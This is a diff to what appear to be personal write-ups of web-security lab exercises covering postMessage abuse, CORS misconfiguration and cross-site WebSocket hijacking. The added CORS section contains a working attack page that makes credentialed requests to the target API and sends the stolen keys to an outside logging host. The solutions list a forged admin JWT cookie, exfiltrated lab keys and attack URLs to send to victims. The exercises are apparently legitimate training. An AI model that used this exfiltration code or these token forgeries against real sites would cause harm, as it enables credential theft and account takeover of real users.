@@ -271,6 +271,7 @@ document.getElementById('mf').contentWindow.postMessage(payload,'*');
 ```
 
 Solution
+
 ```
 auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8MO4_HYfCEr6pXYSqO3P4F4baNyHVt6KijsQAoim4-U
 put this as the cookie to log in as admin
@@ -298,6 +299,7 @@ setTimeout(function() { w.postMessage('user=asdf&id=0','*'); }, 2000);
 ```
 
 Solution
+
 ```
 Send to the vicim: http://18.191.42.249/pm4.html
 Secret shared with you
@@ -305,4 +307,73 @@ Name	Value
 PTLAB_KEY	529083fc-5640-4741-a475-5f6e31188b3b
 ```
 
+### CORS II
+
+Notes
+
+- One of the most common issues with CORS is that `Access-Control-Allow-Origin` from the response is simply `Origin` from the request echoed back.
+- This is exploitable if the application is using cookies for authentication instead of a header as they will be sent automatically by the browser.
+
+Code
+
+```
+<html>
+<body>
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://api-ptl-ad42da05-c93d6931.libcurl.so//api/v1/keys', true);
+xhr.withCredentials = true;
+xhr.onload = function() {
+    var xhr2 = new XMLHttpRequest();
+    xhr2.open('GET','http://18.191.42.249/log.php?c='+xhr.response);
+    xhr2.send(null);
+};
+xhr.send('{}');
+</script>
+
+</body>
+</html>
+```
+
+Solution
+
+```
+http://18.191.42.249/cors2.html
+{"keys":[{"name":"admin_key","value":"f4edb0d7-2aa4-4f61-a091-122d7e36e8a6"}]}
+```
+
+## Cross-Site WebSocket Hijacking (CSWSH)
+
+Resources
+
+- https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html
+- https://medium.com/@sharan.panegav/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50
+- https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information
+- https://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html
+
+Notes
+
+- As opposed to XMLHttpRequest, WebSockets don't follow the same-origin policy.
+- To prevent this issue, the backend should check the Origin header to ensure that the Origin is part of a strict whitelist.
+
+Code
+
+```
+<html>
+<body>
+<script>
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET','http://ptl-2d419260-8ca46436.libcurl.so/search?search=^z');
+
+t1 = performance.now();
+xhr.send(null);
+t2 = performance.now();
+document.write(t2-t1);
+
+</script>
+</body>
+</html>
+```
 
